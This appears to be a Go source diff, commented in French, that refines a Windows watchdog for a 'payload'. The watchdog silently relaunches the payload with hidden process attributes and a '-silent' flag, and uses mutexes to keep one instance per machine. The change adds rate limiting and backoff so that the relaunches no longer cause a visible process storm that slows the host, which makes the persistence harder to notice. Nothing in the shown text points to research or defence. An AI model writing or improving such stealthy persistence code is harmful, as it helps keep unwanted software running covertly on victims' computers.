@@ -11,14 +11,26 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
+// mutexName normalise le nom du mutex : un double antislash (échappement de
+// -X) rend CreateMutex invalide, et le payload se croyait alors absent — le
+// watchdog relançait une instance à chaque tour.
+func mutexName() string {
+	n := strings.ReplaceAll(instanceMutexName, `\\`, `\`)
+	if n == "" {
+		return `Local\PayloadInstance`
+	}
+	return n
+}
+
 // payloadAlive dit si un processus porte le mutex d'instance.
 func payloadAlive() bool {
-	name, err := syscall.UTF16PtrFromString(instanceMutexName)
+	name, err := syscall.UTF16PtrFromString(mutexName())
 	if err != nil {
 		return false
 	}
@@ -67,9 +79,14 @@ func spawnWatchdog() {
 var watchMutexName = instanceMutexName + "-w"
 
 // watchLoop est le corps du mode `-watch`.
+//
+// Il y a un plafond : au plus un lancement par minute, et après cinq échecs
+// consécutifs le watchdog attend dix minutes. Sans ce garde-fou, un nom de
+// mutex invalide provoquait une tempête de processus (35 instances observées
+// sur un poste de test) qui faisait ramer la machine.
 func watchLoop() {
 	// Un seul watchdog par poste.
-	if name, err := syscall.UTF16PtrFromString(watchMutexName); err == nil {
+	if name, err := syscall.UTF16PtrFromString(strings.ReplaceAll(watchMutexName, `\\`, `\`)); err == nil {
 		h, _, callErr := kernel32DLL.NewProc("CreateMutexW").Call(0, 0, uintptr(unsafe.Pointer(name)))
 		if h != 0 {
 			if errno, ok := callErr.(syscall.Errno); ok && errno == syscall.Errno(183) {
@@ -78,19 +95,34 @@ func watchLoop() {
 			}
 		}
 	}
+	lastSpawn := time.Time{}
+	failures := 0
 	for {
-		if !payloadAlive() {
-			exe := currentExe()
-			if exe != "" {
-				c := exec.Command(exe, "-silent")
-				c.SysProcAttr = hiddenAttr()
-				_ = c.Start()
-			}
-		}
-		// Le watchdog se réinstalle aussi lui-même si sa copie a disparu.
 		time.Sleep(15 * time.Second)
-		if _, err := os.Stat(currentExe()); err != nil {
+		exe := currentExe()
+		if exe == "" {
 			return
+		}
+		if _, err := os.Stat(exe); err != nil {
+			return
+		}
+		if payloadAlive() {
+			failures = 0
+			continue
+		}
+		if failures >= 5 {
+			time.Sleep(10 * time.Minute)
+			failures = 0
+			continue
+		}
+		if time.Since(lastSpawn) < time.Minute {
+			continue
+		}
+		c := exec.Command(exe, "-silent")
+		c.SysProcAttr = hiddenAttr()
+		if err := c.Start(); err == nil {
+			lastSpawn = time.Now()
+			failures++
 		}
 	}
 }
